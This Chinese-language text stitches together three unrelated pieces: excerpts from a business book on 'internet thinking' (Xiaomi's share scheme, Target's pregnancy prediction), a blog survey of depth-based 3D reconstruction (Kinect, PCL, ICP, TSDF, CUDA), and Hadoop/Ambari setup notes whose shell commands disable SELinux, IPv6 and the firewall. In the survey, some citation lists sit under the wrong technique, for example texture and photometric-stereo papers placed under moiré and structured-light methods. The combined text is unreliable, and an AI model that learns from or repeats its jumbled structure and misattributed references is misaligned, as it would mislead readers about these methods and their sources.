第20章 开放思维
每一个从业者必须认识到，如果你不能学会主动迎接，不对这种网民自由参与分享的精神保持敬畏之心，你就会被炸得粉碎。
第21章 平台思维
所谓扁平化的管理模式，就是尽量减少公司内部的管理层次，压缩职能部门和机构，使企业的决策层和操作层之间的中间管理层级尽可能地减少，以便使企业快速地将决策权延至企业生产、营销的最前线，从而提高企业效率的管理模式。
雷军自有心得，他曾经打过一个“小餐馆理论”的比喻。一个小餐馆成不成功一看便知，这个标志就是有没有人排队。 第一，小餐馆一般大厨就是老板自己，饭菜好不好他自己最清楚，而且大厨每天在店里盯着，跟来的很多熟客都是朋友，也最能了解客人的需求。第二，他有很强的定力，每天只研究一件事情，就是怎么把菜做好，虽然赚钱重要，但是做好菜比赚更多的钱更重要。这就是为什么客人要排队的原因。
透明的利益分享机制正是对他们付出的劳动保证。
雷军作为天使投资人投资多玩YY，李学凌曾经因为得力干将张帆带领团队集体离职另立门户而向雷军大倒苦水。雷军对李学凌说：“你找到一帮人一起创业，为什么干了两三年人家会离开？这是个标准问题，很多创业公司都在发生。你带着以前的子弟兵一起创业，给了人家很高的预期，但是从内心深处，你却没有准备和人家一起分享未来的成果，总觉得人家是打工的。别人利益方面得不到保障，精神层面得不到认同，自然会选择离开。”
小米内部有个“卖嫁妆”的段子，说的就是这次全员持股的事情。作为小米公司创始的14人之一，当时唯一的女员工小管，承担了小米公司创业初期从人力资源到行政，从后勤到前台的全部工作。虽然她不是技术人却像其他人一样付出了自己的劳动，虽然她不懂得科技的发展趋势，却对小米的未来充满了信心。 听说公司要全员持股，她是很兴奋了一段时间的。但是毕竟自己工作时间太短，没有什么积蓄，家里也没有什么能力帮她。她认真思考再三，便和未婚夫商议，决定先把自己的嫁妆卖掉，投资小米。等将来公司股份涨了，再买嫁妆也不迟。当然，这部分嫁妆现在已成天价。 要建立一个企业的不易，更知道要让一个团队能持久保持凝聚力，只有目标一致，利益清晰，才能做到上下一心，无往而不利。

第22章 顺势思维
几乎所有的成功企业，都是注重危机意识的企业。比如，海尔集团以“永远战战兢兢，永远如履薄冰”为生存理念；小天鹅公司实行的“末日管理”战略，坚守“企业最好的时候，也就是最危险的时候”的理念；还有已经成为“全球最好的中文搜索引擎”的百度，其创始人李彦宏却始终在公司上下传达“百度离灭亡只有30天”的警示……这些强大的企业无时不保持着居安思危的警惕性，在各方面注重防患于未然，使企业保持蓬勃向上的发展势头。
第23章 连接思维
马化腾认为，这两年移动互联网手机成为人的一个电子器官的延伸，这个特征越来越明显，摄像头、感应器，人的器官延伸增强了，而且通过互联网连在一起了，这是前所未有的。
上世纪90年代中期，丰田公司（Toyota）的一家子公司为了追踪汽车配件而发明了二维码。2002年，二维码技术在日本开始商业应用，2003年二维码在韩国商业应用。日韩在全球范围都是二维码应用最早且最成功的国家。2006年中国移动率先在国内推出二维码业务，通过手机上网的WAP方式应用二维码业务。

第24章 大数据思维
大数据思维带来三个革新：不是分析随机样本，而是分析全体数据；不是执迷于数据的精确性，而是执迷于数据的混杂性；知道“是什么”就够了，没必要知道“为什么”。 数据就是资产
IDC预测全球数据量大约每两年翻一番，2015年全球数据量将达到近8ZB，到2020年，全球将达到35ZB。
孕妇在怀孕头3个月过后会购买大量无味的润肤露；有时在头20周，孕妇会补充如钙、镁、锌等营养素；许多顾客都会购买肥皂和棉球，但当有人除了购买洗手液和毛巾以外，还突然开始大量采购无味肥皂和特大包装的棉球时，说明她们的预产期要来了。在塔吉特的数据库资料里，统计师们根据顾客内在需求数据，精准地选出其中的25种商品，对这25种商品进行同步分析，基本上可以判断出哪些顾客是孕妇，甚至还可以进一步估算出她们的预产期，在最恰当的时候给她们寄去最符合她们需要的优惠券，满足她们最实际的需求。

第25章 物联网思维
什么叫体验？举个例子，华夏银行请我吃饭，假设说。我打开一瓶矿泉水，喝完之后，它确实是矿泉水，这叫体验吗？这不叫体验。只有把一个东西做到极致，超出预期才叫体验。比如，有人递过一个矿泉水瓶子，我一喝里面全是50度的茅台，这个就超出我的体验嘛。我就会到处讲我到哪儿吃饭，我以为是矿泉水，结果里面是茅台，我要写一个微博，绝对转发500次以上。
互联网时代、移动互联网时代，一个企业看似好像牢不可破，其实都有大的危机，稍微把握不住这个趋势的话，其实就非常危险，之前积累的东西就可能灰飞烟灭了……
酒店做好产品和服务，餐厅做出美味的菜品，永远都是我们线下企业最重要的核心价值，线上平台永远无法替代这种体验式服务。移动互联网，提供了我们跟用户沟通和交易的更有效手段，不需要或者极少需要任何第三者插足其间。我们将自己的核心价值，直接和最终用户对接，使得他们方便、迅捷、不贵。
有焦虑，才会有思考；有思考，才会有突破；有突破，才会有璀璨的未来。










三维重建技术通过深度数据获取、预处理、点云配准与融合、生成表面等过程，把真实场景刻画成符合计算机逻辑表达的数学模型。这种模型可以对如文物保护、游戏开发、建筑设计、临床医学等研究起到辅助的作用。
1.1 研究背景及意义
人类通过双眼来探索与发现世界。人类接收外部信息的方式中，有不到三成来自于听觉、触觉、嗅觉等感受器官，而超过七成、最丰富、最复杂的信息则通过视觉[1]进行感知的。计算机视觉便是一种探索给计算机装备眼睛（摄像头）与大脑（算法）的技术，以使计算机能够自主独立的控制行为、解决问题，同时感知、理解、分析外部环境。20世纪60年代，计算机视觉得到了最初的发展。该阶段的研究重心主要体现在如何从二维图像中恢复出如立方体、圆柱体等立体化的三维形状，解释各个物体的空间位置关系。1982年，David Marr[2]从信息处理的角度对数学、神经生理学、计算机图形学等学科的研究成果进行了归纳总结，并在此基础上提出了一系列计算机视觉理论。得益于这个完整明确的理论体系，计算机视觉得到了蓬勃的发展。它的核心思想是从二维图像恢复三维结构。图1-1展示的是经典Marr视觉信息处理过程。 

图1-1 Marr视觉信息处理过程 
Fig.1-1 Process of Marr visual information 
随着科学技术的日新月异，计算机视觉的应用日益受到各行业的关注和重视，如设备检测与监视、医学图像处理、文物保护[3]、机器人视觉、自动导航、工业产品外观设计与生产等领域。计算机视觉技术为人们带来了机遇，也带来了挑战。三维重建作为计算机视觉技术中最为最为热门的研究方向之一，涉及到包括图像处理、立体视觉、模式识别等多个学科体系。利用计算机建立表达现实客观景物的三维模型，并以此来满足生产和生活的需要。随着工业化进程的不断发展，多种技术的实现均有赖于目标物体三维信息的获取。三维重建现已被广发的应用于生活和科研工作中，特别是在医学治疗、文物保护、游戏开发、工业设计、航天航海等方面，展现出了极强的生命力和影响力。
1.2 三维重建技术简介
三维重建技术的重点在于如何获取目标场景或物体的深度信息。在景物深度信息已知的条件下，只需要经过点云数据[4]的配准及融合，即可实现景物的三维重建。基于三维重建模型的深层次应用研究也可以随即展开。人们按照被动式测量与主动式测量[5]对目标物体深度信息的获取方法进行了分类，下面对这两种方式进行相应的介绍。
1.2.1 被动式三维重建技术
被动式一般利用周围环境如自然光的反射，使用相机获取图像，然后通过特定算法计算得到物体的立体空间信息。主要有以下三种方法：
1.纹理恢复形状法
各种物体表面具有不同的纹理信息，这种信息由纹理元组成，根据纹理元可以确定表面方向，从而恢复出相应的三维表面。这种方法称为纹理恢复形状法[6] (Shape From Texture，SFT)。 
纹理法的基本理论为：作为图像视野中不断重复的视觉基元，纹理元覆盖在各个位置和方向上。当某个布满纹理元的物体被投射在平面上时，其相应的纹理元也会发生弯折与变化。例如透视收缩变形使与图像平面夹角越小的纹理元越长，投影变形会使离图像平面越近的纹理元越大。通过对图像的测量来获取变形，进而根据变形后的纹理元，逆向计算出深度数据。SFT对物体表面纹理信息的要求严苛，需要了解成像投影中纹理元的畸变信息，应用范围较窄，只适合纹理特性确定等某些特殊情形。所有在实际使用中较为少见。
2.阴影恢复形状法
SFS[7] (Shape From Shading，从阴影恢复形状)法也是一种较为常用的方法。考虑到图像的阴影边界包含了图像的轮廓特征信息，因此能够利用不同光照条件下的图像的明暗程度与阴影来计算物体表面的深度信息，并以反射光照模型进行三维重建。需要注意的是，像素点的亮度受到包括光源指标、摄像机参数、目标表面材质等的制约。 
阴影恢复形状法的应用范围比较广泛，可以恢复除镜面外的各种物体的三维模型。缺点体现在过程多为数学计算、重建结果不够精细，另外不能忽视的是，SFS法需要准确的光源参数，包括位置与方向信息。这就导致其无法应用于诸如露天场景等具有复杂光线的情形中。
3.立体视觉法
立体视觉法[8]（Multi-View Stereo，MVS)是另外一种常用的三维重建方法。主要包括直接利用测距器获取程距信息、通过一幅图像推测三维信息和利用不同视点上的两幅或多幅图像恢复三维信息等三种方式。通过模拟人类视觉系统，基于视差原理获取图像对应点之间的位置偏差，恢复出三维信息。S.T.Barnard[9]等人对20世纪70年代到80年代之间出现的三维重建的算法和评价体系做了概述。到了80年代中后期，出现了更多、更深层次的视觉原理，包括立体测量方法和深度传感器等，极大的促进了相关学科的发展。新兴方法可以直接获取景物的三维信息，极大的节省了物力与人力成本。U.R.Dhond[10]等人提出了基于层次处理的三目立体约束方法。二十世纪90年代末，涌现出诸如图像匹配的前沿算法、遮挡处理算法等。M.Z.Brown[11]等人总结了2000年到2010年间的三维视觉发展的总体概况，包括遮挡、配准和效率等的相关分析。 
双目立体视觉重建，在实际应用情况优于其他基于视觉的三维重建方法，也逐渐出现在一部分商业化产品上; 不足的是运算量仍然偏大，而且在基线距离较大的情况下重建效果明显降低 。 
代表文章：AKIMOIO T Automatic creation of 3D facial models 1993 
CHEN C L Visual binocular vison systems to solid model reconstruction2007 
作为计算机视觉的关键技术之一，立体视觉法也其弊端。例如，立体视觉需要假设空间的平面是正平面，而实际情况却与此相差甚远。除此之外，匹配还存在歧义性：对于一幅图像上的某些特征点，另外的图像可能存在若干个与之相似的特征点。那么如何选取最适配的匹配点，显得较为棘手。如图1-2所示，展示了Middlebury[16]数据集中Teddy和Cones场景的基准彩色图像、标准视差以及通过Graph Cuts[17]算法获取的立体匹配视差估计结果。虽然视差结果体现出了景物的三维位置关系，但是某些像素点的视差与标准值仍有细微的差距。除此之外，对于如相机运动参数的确定、大型场景重建需要获取多帧图像等问题，也极大的影响了立体视觉的深层次应用。 
 
图1-2(a) 基准彩色图像 
 
图1-2(b) 标准视差 
参考：立体匹配导论
1.2.2 主动式三维重建技术
主动式是指利用如激光、声波、电磁波等光源或能量源发射至目标物体，通过接收返回的光波来获取物体的深度信息。主动测距有莫尔条纹法、飞行时间法、结构光法和三角测距法等四种方法。
1.莫尔条纹法
莫尔条纹在生活中比较常见，如两层薄薄的丝绸重叠在一起，即可以看到不规则的莫尔(Morie)条纹；微风的吹动窗纱时，条纹亦随之运动。莫尔条纹法[18]起源于18世纪的法国，是一项古老又现代的测量方法。基本原理是将两块等间隔排列的直线簇或曲线簇图案重叠起来，以非常小的角度进行相对运动来形成莫尔条纹。如图1-3所示，在主光栅与指示光栅的交叉重合处，因光线的透射与遮挡而产生不同的明暗带，即莫尔条纹。莫尔条纹随着光栅的左右平移而发生垂直位移，此时产生的条纹相位信息体现了待测物体表面的深度信息，再通过逆向的解调函数，实现深度信息的恢复。这种方法具有精度高、实时性强的优点，但是其对光照较为敏感，抗干扰能力弱。 
 
图1-3 双光栅莫尔条纹法
提出：WIKTIN recovering surface shape and orientation from texture (1987)（被引用454 次）。 
发展：Warren 2010 对 wiktin 方法进行改进使用了透视投影； 
Liboy 2006 给出了在纹理单元结构发生改变的情况下的重建方法。 
优点：精度高，对光照和噪声不敏感。 
缺点：只应用于具有规则纹理的物体。
2.飞行时间法
飞行时间法[19] (Time of Flight，ToF)指的是在光速及声速一定的前提下，通过测量发射信号与接收信号的飞行时间间隔来获得距离的方法。这种信号可以是超声波，也可以是红外线等。飞行时间法相较于立体视觉法而言，具有不受基线长度限制、与纹理无关、成像速度快等特点。但是其也有一定的缺点。首先，ToF相机的分辨率非常低。例如图1-4所示，当今分辨率最高的PMD Camcube 2.0 相机，也仅为204×204像素；其次，ToF相机容易受到环境因素的影响，如混合像素、外界光源等，导致景物深度不准确；最后，系统误差与随机误差对测量结果的影响很大，需要进行后期数据处理，主要体现在场景像素点的位置重合上。值得注意的是，ToF相机的售价达到了数万美元，受众较窄。 
 
图1-4 SR4000 ToF相机 
Fig.1-4 SR4000 ToF camera
3.结构光法
结构光法[20](Structured Light)通过向表面光滑无特征的物体发射具有特征点的光线，依据光源中的立体信息辅助提取物体的深度信息。具体的过程包括两个步骤，首先利用激光投影仪向目标物体投射可编码的光束，生成特征点；然后根据投射模式与投射光的几何图案，通过三角测量原理计算摄像机光心与特征点之间的距离，由此便可获取生成特征点的深度信息，实现模型重建。这种可编码的光束就是结构光，包括各种特定样式的点、线、面等图案。结构光法解决了物体表面平坦、纹理单一、灰度变化缓慢等问题。因为实现简单且精度较高，所以结构光法的应用非常广泛，目前已有多家公司生产了以结构光技术为基础的硬件设备，如PrimeSense公司的Prime Sensor、微软公司的Kinect和华硕公司的Xtion PRO LIVE等产品[21]。图1-5展示了利用结构光技术采集文物三维信息的场景。 
提出：Woodham 对 SFS 进行改进（1980 年）：photometric method for determining surface orientation from multiple images (该文章被引用了 891 次) 
发展：Noakes ：非线性与噪声减除 2003 年； 
Horocitz ：梯度场合控制点 2004 年； 
Tang ： 可信度传递与马尔科夫随机场 2005 年； 
Basri ： 光源条件未知情况下的三维重建 2007 年； 
Sun ：非朗伯特 2007 年； 
Hernandez ： 彩色光线进行重建方法 2007 年； 
Shi ： 自标定的光度立体视觉法 2010 年。 
 
图1-5 结构光法原理图
4.三角测距法
三角测距法[22]是一种非接触式的测距方法，以三角测量原理为基础。红外设备以一定的角度向物体投射红外线，光遇到物体后发生反射并被CCD（Charge-coupled Device，电荷耦合元件）图像传感器所检测。随着目标物体的移动，此时获取的反射光线也会产生相应的偏移值。根据发射角度、偏移距离、中心矩值和位置关系，便能计算出发射器到物体之间的距离。三角测距法在军工测量、地形勘探等领域中应用广泛。
参考文献
[1] Szeliski R. Computer vision: algorithms and applications[M]. Berlin: Springer, 2010. 
[2] D. Marr, et al. A Computational Theory of Human Stereo Vision. Proc.R.Soc.Lond. 1979, B.204:301-328. 
[3] Levoy, M. Pulli, et al. The Digital Michelangelo Project:3D Scanning of Large Statues. Proc.SIGGRAPH,2000. 
[4] Anand A, Koppula H S, Joachims T, et al. Contextually guided semantic labeling and search for three-dimensional point clouds[J]. The International Journal of Robotics Research, 2013, 32(1):19-34. 
[5] Mada S K, Smith M L, Smith L N, et al. Overview of passive and active vision techniques for hand-held 3D data acquisition [C]//Opto Ireland. International Society for Optics and Photonics, 2003: 16-27. 
[6] D. A. Forsyth, J. Ponce, Computer Vision: A Modern Approach. Prentice Hall 2001 
[7] Horn B. K. P. Shape from shading: a method for obtaining the shape of a smooth opaque object from one view. PhD thesis, Department of Electrical Engineering, MIT, Cambridge. 1970. 
[8] Ikeuchi K. Determining surface orientations of specular surfaces by using the photometric stereo method [J]. Pattern Analysis and Machine Intelligence, IEEE Transactions, 1981, (6): 661-669. 
[9] S. T. Barnard, M. A. Fisehler. Computational Stereo[J].ACM Computing Surveys. 1982, Vol.14:553-572. 
[10] U. R. Dhond, J. K. Aggarval. Struct from Stereo—A Review [J]. IEEE Trans. Systems, Man, and Cybemeties.1989, Vol.19: 1489-1510.
转载请注明出处：http://blog.csdn.net/wangyaninglm/article/details/51558310 
来自：shiter编写程序的艺术 









基于视觉的三维重建，指的是通过摄像机获取场景物体的数据图像，并对此图像进行分析处理，再结合计算机视觉知识推导出现实环境中物体的三维信息。

1. 相关概念

（1）彩色图像与深度图像
彩色图像也叫作RGB图像，R、G、B三个分量对应于红、绿、蓝三个通道的颜色，它们的叠加组成了图像像素的不同灰度级。RGB颜色空间是构成多彩现实世界的基础。深度图像又被称为距离图像，与灰度图像中像素点存储亮度值不同，其像素点存储的是该点到相机的距离，即深度值。图2-1表示深度图像与灰度图像之间的关系。
 
图2-1 深度图像与灰度图像 
Fig.2-1 The depth image and gray image
深度值指的目标物体与测量器材之间的距离。由于深度值的大小只与距离有关，而与环境、光线、方向等因素无关，所以深度图像能够真实准确的体现景物的几何深度信息。通过建立物体的空间模型，能够为深层次的计算机视觉应用提供更坚实的基础。
 
图2-2 人物的彩色图像与深度图像 
Fig.2-2 Color image and depth image of the characters
（2）PCL
PCL（Point Cloud Library，点云库）是由斯坦福大学的Dr.Radu等学者基于ROS(Robot Operating System，机器人操作系统)下开发与维护的开源项目，最初被用来辅助机器人传感、认知和驱动等领域的开发。2011年PCL正式向公众开放。随着对三维点云算法的加入与扩充，PCL逐步发展为免费、开源、大规模、跨平台的C++编程库。
PCL框架包括很多先进的算法和典型的数据结构，如滤波、分割、配准、识别、追踪、可视化、模型拟合、表面重建等诸多功能。能够在各种操作系统和大部分嵌入式系统上运行，具有较强的软件可移植性。鉴于PCL的应用范围非常广，专家学者们对点云库的更新维护也非常及时。PCL的发展时至今日，已经来到了1.7.0版本。相较于早期的版本，加入了更多新鲜、实用、有趣的功能，为点云数据的利用提供了模块化、标准化的解决方案。再通过诸如图形处理器、共享存储并行编程、统一计算设备架构等领先的高性能技术，提升PCL相关进程的速率，实现实时性的应用开发。
在算法方面，PCL是一套包括数据滤波、点云配准、表面生成、图像分割和定位搜索等一系列处理点云数据的算法。基于不同类型区分每一套算法，以此把整合所有三维重建流水线功能，保证每套算法的紧凑性、可重用性与可执行性。例如PCL中实现管道运算的接口流程：
①创建处理对象，例如滤波、特征估计、图像分割等； 
②通过setInputCloud输入初始点云数据，进入处理模块； 
③设置算法相关参数； 
④调用不同功能的函数实现运算，并输出结果。
为了实现模块化的应用与开发，PCL被细分成多组独立的代码集合。因此便可方便快捷的应用于嵌入式系统中，实现可移植的单独编译。如下列举了部分常用的算法模块：
libpcl I/O：完成数据的输入、输出过程，如点云数据的读写； 
libpcl filters：完成数据采样、特征提取、参数拟合等过程； 
libpcl register：完成深度图像的配准过程，例如迭代最近点算法； 
libpcl surface：完成三维模型的表面生成过程，包括三角网格化、表面平滑等。
此类常用的算法模块均具有回归测试功能，以确保使用过程中没有引进错误。测试一般由专门的机构负责编写用例库。检测到回归错误时，会立即将消息反馈给相应的作者。因此能提升PCL和整个系统的安全稳定性。
（3）点云数据
如图2-3所示，展示了典型的点云数据（Point Cloud Data，PCD）模型。
 
图2-3 点云数据及其放大效果
点云数据通常出现在逆向工程中，是由测距设备获取的物体表面的信息集合。其扫描资料以点的形式进行记录，这些点既可以是三维坐标，也可以是颜色或者光照强度等信息。通常所使用的点云数据一般包括点坐标精度、空间分辨率和表面法向量等内容。点云一般以PCD格式进行保存，这种格式的点云数据可操作性较强，同时能够提高点云配准融合的速度。本文研究的点云数据为非结构化的散乱点云，属于三维重建特有的点云特点。
（4）坐标系 
在三维空间中，所有的点必须以坐标的形式来表示，并且可以在不同的坐标系之间进行转换。首先介绍基本坐标系的概念、计算及相互关系。
①图像坐标系
图像坐标系分为像素和物理两个坐标系种类。数字图像的信息以矩阵形式存储，即一副像素的图像数据存储在维矩阵中。图像像素坐标系以为原点、以像素为基本单位，U、V分别为水平、垂直方向轴。图像物理坐标系以摄像机光轴与图像平面的交点作为原点、以米或毫米为基本单位，其X、Y轴分别与U、V轴平行。图2-4展示的是两种坐标系之间的位置关系：
 
图2-4 图像像素坐标系与物理坐标系 
Fig.2-4 Image pixel coordinate system and physical coordinate system
令U-V坐标系下的坐标点(u0，v0)，与代表像素点在X轴与Y轴上的物理尺寸。那么图像中的所有像素点在U-V坐标系与在X-Y坐标系下的坐标间有着如式（2-1）表示的关系： 

其中指的是图像坐标系的坐标轴倾斜相交而形成的倾斜因子（Skew Factor）。
②摄像机坐标系 
摄像机坐标系由摄像机的光心及三条、、轴所构成。它的、轴对应平行于图像物理坐标系中的、轴，轴为摄像机的光轴，并与由原点、、轴所组成的平面垂直。如图2-5所示：
 
图2-5摄像机坐标系
令摄像机的焦距是f，则图像物理坐标系中的点与摄像机坐标系中的点的关系为：
③世界坐标系
考虑到摄像机位置具有不确定性，因此有必要采用世界坐标系来统一摄像机和物体的坐标关系。世界坐标系由原点及、、三条轴组成。世界坐标与摄像机坐标间有着（2-3）所表达的转换关系：
 


( 23 ) 
其中，是旋转矩阵，代表摄像机在世界坐标系下的指向；是平移向量，代表了摄像机的位置。

2.三维重建流程

本文使用Kinect采集景物的点云数据，经过深度图像增强、点云计算与配准、数据融合、表面生成等步骤，完成对景物的三维重建。
 
图2-6 基于深度传感器的三维重建流程图 
Fig.2-6 Flow chart of 3D reconstruction based on depth sensor
图2-6显示的流程表明，对获取到的每一帧深度图像均进行前六步操作，直到处理完若干帧。最后完成纹理映射。下面对每个步骤作详细的说明。
2.1 深度图像的获取
景物的深度图像由Kinect在Windows平台下拍摄获取，同时可以获取其对应的彩色图像。为了获取足够多的图像，需要变换不同的角度来拍摄同一景物，以保证包含景物的全部信息。具体方案既可以是固定Kinect传感器来拍摄旋转平台上的物体；也可以是旋转Kinect传感器来拍摄固定的物体。价格低廉、操作简单的深度传感器设备能够获取实时的景物深度图像，极大的方便了人们的应用。
2.2 预处理
受到设备分辨率等限制，它的深度信息也存在着许多缺点。为了更好的促进后续基于深度图像的应用，必须对深度图像进行去噪和修复等图像增强过程。作为本文的重点问题，具体的处理方法将在第四章进行详细的解释说明。
2.3 点云计算
经过预处理后的深度图像具有二维信息，像素点的值是深度信息，表示物体表面到Kinect传感器之间的直线距离，以毫米为单位。以摄像机成像原理为基础，可以计算出世界坐标系与图像像素坐标系之间具有下式的转换关系：
 

则k值只与有关，而等参数只与摄像机的内部构造有关，所以称为像机的内参数矩阵。以摄像机作为世界坐标系，即，则深度值即为世界坐标系中的值，与之对应的图像坐标就是图像平面的点。
2.4 点云配准
对于多帧通过不同角度拍摄的景物图像，各帧之间包含一定的公共部分。为了利用深度图像进行三维重建，需要对图像进行分析，求解各帧之间的变换参数。深度图像的配准是以场景的公共部分为基准，把不同时间、角度、照度获取的多帧图像叠加匹配到统一的坐标系中。计算出相应的平移向量与旋转矩阵，同时消除冗余信息。点云配准除了会制约三维重建的速度，也会影响到最终模型的精细程度和全局效果。因此必须提升点云配准算法的性能。
三维深度信息的配准按不同的图像输入条件与重建输出需求被分为：粗糙配准、精细配准和全局配准等三类方法。
（1）粗糙配准（Coarse Registration）
粗糙配准研究的是多帧从不同角度采集的深度图像。首先提取两帧图像之间的特征点，这种特征点可以是直线、拐点、曲线曲率等显式特征，也可以是自定义的符号、旋转图形、轴心等类型的特征。
随后根据特征方程实现初步的配准。粗糙配准后的点云和目标点云将处于同一尺度(像素采样间隔)与参考坐标系内，通过自动记录坐标，得到粗匹配初始值。
（2）精细配准（Fine Registration）
精细配准是一种更深层次的配准方法。经过前一步粗配准，得到了变换估计值。将此值作为初始值，在经过不断收敛与迭代的精细配准后，达到更加精准的效果。以经典的由Besl和Mckay[49]提出的ICP（Iterative Closest Point，迭代最近点）算法为例，该算法首先计算初始点云上所有点与目标点云的距离，保证这些点和目标点云的最近点相互对应，同时构造残差平方和的目标函数。
基于最小二乘法对误差函数进行最小化处理，经过反复迭代，直到均方误差小于设定的阈值。ICP算法能够获得精正确无误的配准结果，对自由形态曲面配准问题具有重要意义。另外还有如SAA（Simulate Anneal Arithmetic，模拟退火）算法、GA（Genetic Algorithm，遗传）算法等也有各自的特点与使用范畴。
（3）全局配准（Global Registration）
全局配准是使用整幅图像直接计算转换矩阵。通过对两帧精细配准结果，按照一定的顺序或一次性的进行多帧图像的配准。这两种配准方式分别称为序列配准（Sequential Registration）和同步配准（Simultaneous Registration）。
配准过程中，匹配误差被均匀的分散到各个视角的多帧图像中，达到削减多次迭代引起的累积误差的效果。值得注意的是，虽然全局配准可以减小误差，但是其消耗了较大的内存存储空间，大幅度提升了算法的时间复杂度。
2.5 数据融合
经过配准后的深度信息仍为空间中散乱无序的点云数据，仅能展现景物的部分信息。因此必须对点云数据进行融合处理，以获得更加精细的重建模型。以Kinect传感器的初始位置为原点构造体积网格，网格把点云空间分割成极多的细小立方体，这种立方体叫做体素(Voxel)。通过为所有体素赋予SDF（Signed Distance Field，有效距离场）值，来隐式的模拟表面。
SDF值等于此体素到重建表面的最小距离值。当SDF值大于零，表示该体素在表面前；当SDF小于零时，表示该体素在表面后；当SDF值越接近于零，表示该体素越贴近于场景的真实表面。KinectFusion技术虽然对场景的重建具有高效实时的性能，但是其可重建的空间范围却较小，主要体现在消耗了极大的空间用来存取数目繁多的体素。
为了解决体素占用大量空间的问题，Curless[50]等人提出了TSDF (Truncated Signed Distance Field，截断符号距离场)算法，该方法只存储距真实表面较近的数层体素，而非所有体素。因此能够大幅降低KinectFusion的内存消耗，减少模型冗余点。
 
图2-7 基于空间体的点云融合
TSDF算法采用栅格立方体代表三维空间，每个栅格中存放的是其到物体表面的距离。TSDF值的正负分别代表被遮挡面与可见面，而表面上的点则经过零点，如图2-7中左侧展示的是栅格立方体中的某个模型。若有另外的模型进入立方体，则按照下式(2-9)与(2-10)实现融合处理。
其中，指的是此时点云到栅格的距离，是栅格的初始距离，是用来对同一个栅格距离值进行融合的权重。如图2-7中右侧所示，两个权重之和为新的权重。对于KinectFusion算法而言，当前点云的权重值设置为1。
鉴于TSDF算法采用了最小二乘法进行了优化，点云融合时又利用了权重值，所有该算法对点云数据有着明显的降噪功能。
2.6 表面生成
表面生成的目的是为了构造物体的可视等值面，常用体素级方法直接处理原始灰度体数据。Lorensen[51]提出了经典体素级重建算法：MC（Marching Cube，移动立方体）法。移动立方体法首先将数据场中八个位置相邻的数据分别存放在一个四面体体元的八个顶点处。对于一个边界体素上一条棱边的两个端点而言，当其值一个大于给定的常数T，另一个小于T时，则这条棱边上一定有等值面的一个顶点。
然后计算该体元中十二条棱和等值面的交点，并构造体元中的三角面片，所有的三角面片把体元分成了等值面内与等值面外两块区域。最后连接此数据场中的所有体元的三角面片，构成等值面。合并所有立方体的等值面便可生成完整的三维表面。

3 性能优化

Kinect等深度传感器的出现，不仅给娱乐应用带来了变革，同样对科学研究提供了新的方向。尤其是在三维重建领域。然而由于三维重建过程涉及到大量密集的点云数据处理，计算量巨大，所以对系统进行相应的性能优化显得非常的重要。本文采用基于GPU（Graphic Processing Unit，图形处理器）并行运算功能，以提高整体的运行效率。
NVIDIA公司于1999年提出了GPU概念。在这十几年间，依靠硬件行业的改革创新，芯片上晶体管数量持续增多，GPU性能以半年翻一番的速度成倍提升。GPU的浮点运算能力远超CPU上百倍，却具有非常低的能耗，极具性价比。因GPU不仅广泛应用于图形图像处理中，也在如视频处理、石油勘探、生物化学、卫星遥感数据分析、气象预报、数据挖掘等方面崭露头角。
作为GPU的提出者，NVIDIA公司一直致力于GPU性能提升的研究工作，并在2007年推出了CUDA架构。CUDA（Compute Unified Device Architecture，统一计算设备架构）是一种并行计算程序架构。在CUDA的支持下，使用者可以编写程序以利用NVIDIA系列GPU完成大规模并行计算。GPU在CUDA中被用作通用计算设备，而不只是处理图像。在CUDA中，将计算机CPU称为主机（Host），GPU称为设备（Device）。
主机端和设备端都有程序运行，主机端主要完成程序的流程与串行计算模块，而设备端则专门处理并行计算。其中，设备端的并行计算过程被记录在Kernel内核函数中，主机端可以从Kernel函数入口执行并行计算的调用功能。在此过程中，虽然Kernel函数执行同一代码，但却处理着不同的数据内容。
Kernel函数采用扩展的C语言来编程，称为CUDAC语言。需要注意的是，并不是所有的运算都可以采用CUDA并行计算。只有独立性的计算，如矩阵的加减，因为只涉及到对应下标的元素的加减，不同下标元素毫无关联，所以适用于并行计算；而对于如阶乘的计算则必须对所有数累积相乘，故无法采用并行计算。
CUDA具有线程（Thread）、程序块（Block）、网格（Grid）三级架构，计算过程一般由单一的网格完成，网格被平均分成多个程序块，每个程序块又由多个线程组成，最终由单个线程完成每个基本运算，如图2-8所示。 
 
图2-8 CUDA模型
为了更深入的理解CUDA模型的计算过程，这里以前一章中提到的公式（2-11）为例，计算某点的深度值与三维坐标之间的转换： 
 
上式中的表示深度值，内参数矩阵是已知量，是该点的坐标。可以发现这个点的转换过程与其他点转换过程是相互独立的，所以整幅图像中各点的坐标转换能够并行执行。这种并行计算可以大幅提升整体计算的速率。例如，利用一个网格来计算一幅像素的深度图像到三维坐标的转换，只需要将此网格均分成块，每块包括个线程，每个线程分别操作一个像素点，便可以便捷的完成所有的坐标转换运算。
通过GPU的并行计算，三维重建性能得到了大幅的提升，实现了实时的输入输出。对于Kinect在实际生产生活中的应用奠定了基础。

小结

首先介绍了与三维重建相关的基本概念，包括深度图像、点云数据、四种坐标系及其之间的转换关系等。 






1.Ambari安装


Ambari & HDP（Hortonworks Data Platform）
*****************************************************************************************************
Base：
0.操作系统原则与对应的HDP对应的版本。rhel6 or rhel7
1.操作系统原则完全安装(Desktop)，所有的包都安装。
2.关闭防火墙，IPV6等服务（海涛Python脚本）。SELinux-->>IPv6-->>Iptables
_____________________________________________________________
SELINUX:
vim /etc/selinux/config
SELINUX=disabled
或者：
sed -i 's/SELINUX=enforcing/SELINUX=disabled/g' /etc/selinux/config;
_____________________________________________________________
IPV6：
chkconfig ip6tables off
cat>>/etc/modprobe.d/ECS.conf<<EOF
alias net-pf-10 off
alias ipv6 off
EOF
cat>>/etc/sysconfig/network<<EOF
NETWORKING_IPV6=off 
EOF
cat>>/etc/modprobe.d/disable-ipv6.conf<<EOF
install ipv6 /bin/true
EOF
cat>>/etc/modprobe.d/dist.conf<<EOF
alias net-pf-10 off
alias ipv6 off
EOF
cat>>/etc/sysctl.conf<<EOF
net.ipv6.conf.all.disable_ipv6 = 1
EOF
_____________________________________________________________
iptables:
chkconfig iptables off
_____________________________________________________________
ONBOOT:
sed -i 's/ONBOOT=no/ONBOOT=yes/g' /etc/sysconfig/network-scripts/ifcfg-eth0
sed -i 's/ONBOOT=no/ONBOOT=yes/g' /etc/sysconfig/network-scripts/ifcfg-eth1
sed -i 's/ONBOOT=no/ONBOOT=yes/g' /etc/sysconfig/network-scripts/ifcfg-eth2
sed -i 's/ONBOOT=no/ONBOOT=yes/g' /etc/sysconfig/network-scripts/ifcfg-eth3
